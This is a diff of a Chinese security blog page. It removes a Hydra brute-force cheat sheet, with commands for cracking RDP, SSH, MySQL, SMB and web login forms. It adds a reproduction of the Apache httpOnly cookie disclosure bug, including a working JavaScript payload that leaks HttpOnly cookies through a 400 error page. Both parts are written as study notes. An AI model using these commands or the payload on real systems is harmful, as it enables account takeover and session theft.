@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="m3lon">
+  <meta name="keywords" content="Web安全,">
 
 
 
@@ -79,17 +79,21 @@
 
 
 
-<meta name="description" content="转载：http://www.luxinzhi.com/safe/438.html Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MI">
+<meta name="description" content="昨天跟朋友一起看一个Apache httpOnly cookie disclosure的漏洞, 涉及到一些知识点, 记录下. 关于Apache httpOnly cookie disclosure这个漏洞, 详情可参考 https://www.t00ls.net/articles-21760.html 当低版本的apache接收到一个大于4k的cookie的时候，会返回一个400的错误，并且把所有">
+<meta name="keywords" content="Web安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="暴力破解工具-hydra命令总结">
-<meta property="og:url" content="http://m3lon.github.io/2019/03/23/暴力破解工具-hydra命令总结/index.html">
+<meta property="og:title" content="Apache httpOnly cookie disclosure引发的Cookie思考">
+<meta property="og:url" content="http://m3lon.github.io/2020/03/15/Apache httpOnly cookie disclosure引发的Cookie思考/index.html">
 <meta property="og:site_name" content="m3lon">
-<meta property="og:description" content="转载：http://www.luxinzhi.com/safe/438.html Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MI">
+<meta property="og:description" content="昨天跟朋友一起看一个Apache httpOnly cookie disclosure的漏洞, 涉及到一些知识点, 记录下. 关于Apache httpOnly cookie disclosure这个漏洞, 详情可参考 https://www.t00ls.net/articles-21760.html 当低版本的apache接收到一个大于4k的cookie的时候，会返回一个400的错误，并且把所有">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-03-26T03:43:31.575Z">
+<meta property="og:image" content="http://m3lon.github.io/2020/03/15/Apache%20httpOnly%20cookie%20disclosure引发的Cookie思考/1.png">
+<meta property="og:image" content="http://m3lon.github.io/2020/03/15/Apache%20httpOnly%20cookie%20disclosure引发的Cookie思考/2.png">
+<meta property="og:updated_time" content="2020-03-15T12:11:21.279Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="暴力破解工具-hydra命令总结">
-<meta name="twitter:description" content="转载：http://www.luxinzhi.com/safe/438.html Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MI">
+<meta name="twitter:title" content="Apache httpOnly cookie disclosure引发的Cookie思考">
+<meta name="twitter:description" content="昨天跟朋友一起看一个Apache httpOnly cookie disclosure的漏洞, 涉及到一些知识点, 记录下. 关于Apache httpOnly cookie disclosure这个漏洞, 详情可参考 https://www.t00ls.net/articles-21760.html 当低版本的apache接收到一个大于4k的cookie的时候，会返回一个400的错误，并且把所有">
+<meta name="twitter:image" content="http://m3lon.github.io/2020/03/15/Apache%20httpOnly%20cookie%20disclosure引发的Cookie思考/1.png">
 
 
 
@@ -119,13 +123,13 @@
 
 
 
-  <link rel="canonical" href="http://m3lon.github.io/2019/03/23/暴力破解工具-hydra命令总结/">
+  <link rel="canonical" href="http://m3lon.github.io/2020/03/15/Apache httpOnly cookie disclosure引发的Cookie思考/">
 
 
 
 
 
-  <title>暴力破解工具-hydra命令总结 | m3lon</title>
+  <title>Apache httpOnly cookie disclosure引发的Cookie思考 | m3lon</title>
   
 
 
@@ -292,7 +296,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://m3lon.github.io/2019/03/23/暴力破解工具-hydra命令总结/">
+    <link itemprop="mainEntityOfPage" href="http://m3lon.github.io/2020/03/15/Apache httpOnly cookie disclosure引发的Cookie思考/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="m3lon">
@@ -309,7 +313,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">暴力破解工具-hydra命令总结</h1>
+          <h1 class="post-title" itemprop="name headline">Apache httpOnly cookie disclosure引发的Cookie思考</h1>
         
 
         <div class="post-meta">
@@ -321,8 +325,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-23T15:20:40+08:00">
-                2019-03-23
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-03-15T20:03:14+08:00">
+                2020-03-15
               </time>
             
 
@@ -331,28 +335,6 @@
             
           </span>
 
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/工具教程/" itemprop="url" rel="index">
-                    <span itemprop="name">工具教程</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -381,31 +363,20 @@
       
 
       
-        <p>转载：<a href="http://www.luxinzhi.com/safe/438.html" target="_blank" rel="noopener">http://www.luxinzhi.com/safe/438.html</a></p>
-<p>Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [service://server[:PORT][/OPT]]</p>
-<p>命令参数：</p>
-<p>-R：继续从上一次进度接着破解<br>-S：大写，采用SSL链接<br><strong>-s ：小写，可通过这个参数指定非默认端口</strong><br><strong>-l ：指定破解的用户，对特定用户破解</strong><br><strong>-L ：指定用户名字典</strong><br><strong>-p ：小写，指定密码破解，少用，一般是采用密码字典</strong><br><strong>-P ：大写，指定密码字典</strong><br>-e ：可选选项，n：空密码试探，s：使用指定用户和密码试探<br>-C ：使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数<br>-M ：指定目标列表文件一行一条<br>-o ：指定结果输出文件<br><strong>-f：在使用-M参数以后，找到第一对登录名或者密码的时候中止破解</strong><br>-t ：同时运行的线程数，默认为16<br>-w ：设置最大超时的时间，单位秒，默认是30s<br>-v / -V：显示详细过程<br>-o 可导出文件<br>server：目标ip </p>
-<p>常用协议暴力破解参数格式：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">破解rdp(3389)：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -l administrator -P password.txt -V IP rdp</span></span><br><span class="line">破解mysql：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra ip -L 用户名 -P pass.txt -V mysql</span></span><br><span class="line">破解ssh：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -L user.txt -P password.txt -e ns -vV IP ssh</span></span><br><span class="line">破解https：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -m /index.php -l muts -P pass.txt IP https</span></span><br><span class="line">破解teamspeak：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak</span></span><br><span class="line">破解cisco：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -P pass.txt IP cisco</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -m cloud -P pass.txt IP cisco-enable</span></span><br><span class="line">破解smb：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -l administrator -P pass.txt IP smb</span></span><br><span class="line">破解pop3：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -l muts -P pass.txt my.pop3.mail pop3</span></span><br><span class="line">破解http-proxy：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -l admin -P pass.txt http-proxy://IP</span></span><br><span class="line">破解imap：</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -L user.txt -p imap://ip PLAIN</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN</span></span><br><span class="line">破解telnet</span><br><span class="line"><span class="meta">#</span><span class="bash"> hydra ip telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V</span></span><br></pre></td></tr></table></figure>
-<p>补充：</p>
-<p>post方式提交，破解web登录：该软件的强大之处就在于支持多种协议的破解，同样也支持对于web用户界面的登录破解，get方式提交的表单比较简单，这里通过post方式提交密码破解提供思路。该工具有一个不好的地方就是，如果目标网站登录时候需要验证码就无法破解了。</p>
-<p>带参数破解如下：</p>
-<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># hydra -l admin -P <span class="keyword">pass</span>.lst -o ok.lst -t <span class="number">1</span> -f www.superl.org http-post-<span class="keyword">form</span> “<span class="built_in">index</span>.php:<span class="keyword">name</span>=^USER^&amp;pwd=^<span class="keyword">PASS</span>^:invalido”</span><br></pre></td></tr></table></figure>
-<p>说明：破解的用户名是admin，密码字典是pass.lst，破解结果保存在ok.lst，-t 是同时线程数为1，-f 是当破解了一个密码就停止，<a href="http://www.superl.org是网站域名，就是目标ip，http-post-form表示破解是采用http" target="_blank" rel="noopener">www.superl.org是网站域名，就是目标ip，http-post-form表示破解是采用http</a> 的post 方式提交的表单密码破解。后面参数是网页中对应的表单字段的name 属性，后面中的内容是表示错误猜解的返回信息提示，可以自定义。</p>
-<blockquote>
+        <p>昨天跟朋友一起看一个Apache httpOnly cookie disclosure的漏洞, 涉及到一些知识点, 记录下.</p>
+<p>关于Apache httpOnly cookie disclosure这个漏洞, 详情可参考 <a href="https://www.t00ls.net/articles-21760.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-21760.html</a></p>
+<p>当低版本的apache接收到一个大于4k的cookie的时候，会返回一个400的错误，并且把所有的cookie完整的在页面当中显示出来，提示这个cookie过大，那么我们的攻击方式便是利用xss，给用户在正常的cookie的基础上再增加一些无用的cookie，使用户的cookie大于4k，然后js再发包请求一次网站，这时apache返回的响应就是400，并把cookie显示出来</p>
+<p>漏洞本身不难理解, 不过在cookie这个地方卡了下, 我们做个简单的复现</p>
+<p>在firefox下执行payload</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookies</span> (<span class="params">good</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Construct string for cookie value</span></span><br><span class="line">    <span class="keyword">var</span> str = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt; <span class="number">819</span>; i++) &#123;</span><br><span class="line">        str += <span class="string">"x"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Set cookies</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// Expire evil cookie</span></span><br><span class="line">        <span class="keyword">if</span> (good) &#123;</span><br><span class="line">            <span class="keyword">var</span> cookie = <span class="string">"xss"</span>+i+<span class="string">"=;expires="</span>+<span class="keyword">new</span> <span class="built_in">Date</span>(+<span class="keyword">new</span> <span class="built_in">Date</span>()<span class="number">-1</span>).toUTCString()+<span class="string">"; path=/;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Set evil cookie</span></span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> cookie = <span class="string">"xss"</span>+i+<span class="string">"="</span>+str+<span class="string">";path=/"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">document</span>.cookie = cookie;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeRequest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    setCookies();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parseCookies</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> cookie_dict = &#123;&#125;;</span><br><span class="line">        <span class="comment">// Only react on 400 status</span></span><br><span class="line">        <span class="keyword">if</span> (xhr.readyState === <span class="number">4</span> &amp;&amp; xhr.status === <span class="number">400</span>) &#123;</span><br><span class="line">            <span class="comment">// Replace newlines and match &lt;pre&gt; content</span></span><br><span class="line">            <span class="keyword">var</span> content = xhr.responseText.replace(<span class="regexp">/\r|\n/g</span>,<span class="string">''</span>).match(<span class="regexp">/&lt;pre&gt;(.+)&lt;\/pre&gt;/</span>);</span><br><span class="line">            <span class="keyword">if</span> (content.length) &#123;</span><br><span class="line">                <span class="comment">// Remove Cookie: prefix</span></span><br><span class="line">                content = content[<span class="number">1</span>].replace(<span class="string">"Cookie: "</span>, <span class="string">""</span>);</span><br><span class="line">                <span class="keyword">var</span> cookies = content.replace(<span class="regexp">/xss\d=x+;?/g</span>, <span class="string">''</span>).split(<span class="regexp">/;/g</span>);</span><br><span class="line">                <span class="comment">// Add cookies to object</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;cookies.length; i++) &#123;</span><br><span class="line">                    <span class="keyword">var</span> s_c = cookies[i].split(<span class="string">'='</span>,<span class="number">2</span>);</span><br><span class="line">                    cookie_dict[s_c[<span class="number">0</span>]] = s_c[<span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// Unset malicious cookies</span></span><br><span class="line">            setCookies(<span class="literal">true</span>);</span><br><span class="line">            alert(<span class="built_in">JSON</span>.stringify(cookie_dict));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Make XHR request</span></span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    xhr.onreadystatechange = parseCookies;</span><br><span class="line">    xhr.open(<span class="string">"GET"</span>, <span class="string">"/"</span>, <span class="literal">true</span>);</span><br><span class="line">    xhr.send(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">makeRequest();</span><br></pre></td></tr></table></figure>
+<p><img src="1.png" alt=""></p>
+<p>Cookie已经被追加到很长了, 分析payload的过程中看setcookies函数, 只是将xss0=x…x等赋值给document.cookie, 但为啥打印document.cookie只是在后面追加了呢? 我想这也是为什么这个payload可以导致apache报错爆出真正cookie的原因.</p>
+<p>这里就涉及到我想要记录的Cookie知识点了, 看这里</p>
+<p><img src="2.png" alt=""></p>
 <ol>
-<li>域名前面不需要加http:// When using hydra, it’s <strong>not required to put http://</strong> before the host that you’re going to attack.</li>
-<li>需指定端口，用-s参数  To <strong>specify the port</strong>, please use the <code>-s</code> flag.</li>
-<li>post请求，需要制定服务器目标文件地址如：In the POST request you have to <strong>specify the file that is going to receive the POST request</strong> (e.g. index.php, password.php, validate.php, etc.)</li>
-<li>最后需要指定正确或者错误情况下的输出信息 And last, but not least, you <strong>have to specify the Success case or the Fail case.</strong></li>
+<li><strong>如果修改相同path下的key值, 如username=”m3lon”, 则会覆盖</strong></li>
+<li><strong>如果document.cookie=”xss1=m3lon”, 则会在原cookie基础上进行添加, 因此, Apache在400页面中爆出cookie错误中会含有原来的cookie值</strong></li>
 </ol>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l info@test.com -P rockyou.txt  -o ~/ok.lst -f site.test.lab -s 8080 http-post-form <span class="string">"/email/_task=login:_token=ON3n2HxDuhlMfViOmuB8fE2H5CGTd1aQ&amp;_task=login&amp;_action=login&amp;_timezone=Asia%2FShanghai&amp;_url=_task%3Dlogin&amp;_user=^USER^&amp;_pass=^PASS^:InvaildPassword"</span></span><br></pre></td></tr></table></figure>
-<p>其他：</p>
-<p>关于字典：在kali里，是默认自带了字典的，分别放在下面三个文件中：</p>
-<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta-keyword">/usr/</span>share/wordlist <span class="meta">#常用下面的rockyou.txt</span></span><br><span class="line"></span><br><span class="line"><span class="meta-keyword">/usr/</span>share<span class="meta-keyword">/wfuzz/</span>wordlist</span><br><span class="line"></span><br><span class="line"><span class="meta-keyword">/usr/</span>share/seclists</span><br></pre></td></tr></table></figure>
-<p>或者利用kali自带的crunch生成字典。</p>
-<p>关于暴力破解的扩展：<a href="https://securixy.kz/hack-faq/brute-force-vstroennymi-sredstvami-kali-linux.html/" target="_blank" rel="noopener">https://securixy.kz/hack-faq/brute-force-vstroennymi-sredstvami-kali-linux.html/</a></p>
 
       
     </div>
@@ -445,6 +416,12 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/Web安全/" rel="tag"># Web安全</a>
+          
+        </div>
+      
 
       
       
@@ -454,8 +431,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/03/18/解决ubuntu-crontab反弹shell失败的问题/" rel="next" title="解决ubuntu crontab反弹shell失败的问题">
-                <i class="fa fa-chevron-left"></i> 解决ubuntu crontab反弹shell失败的问题
+              <a href="/2019/03/23/暴力破解工具-hydra命令总结/" rel="next" title="暴力破解工具-hydra命令总结">
+                <i class="fa fa-chevron-left"></i> 暴力破解工具-hydra命令总结
               </a>
             
           </div>
@@ -463,10 +440,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2020/03/15/Apache httpOnly cookie disclosure引发的Cookie思考/" rel="prev" title="Apache httpOnly cookie disclosure引发的Cookie思考">
-                Apache httpOnly cookie disclosure引发的Cookie思考 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
